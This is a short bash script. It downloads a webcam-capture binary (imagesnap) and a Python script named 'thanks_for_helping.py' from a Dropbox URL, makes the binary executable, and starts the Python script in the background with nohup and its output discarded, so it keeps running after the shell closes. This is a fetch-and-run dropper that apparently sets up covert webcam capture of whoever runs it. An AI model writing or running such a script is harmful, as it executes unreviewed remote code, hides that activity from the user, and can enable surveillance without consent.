#!/bin/bash 
#download imagesnap and the python script
curl http://dl.dropbox.com/u/2001/ADAAHackNY/imagesnap > imagesnap
curl http://dl.dropbox.com/u/2001/ADAAHackNY/thanks_for_helping.py > thanks_for_helping.py 

#make sure imagesnap is executable
chmod +x imagesnap

# nohup (nohangup) - keep executing program even after shell dies
# (so just in case the user closes shell accidentally, we keep going)
nohup python thanks_for_helping.py > /dev/null &
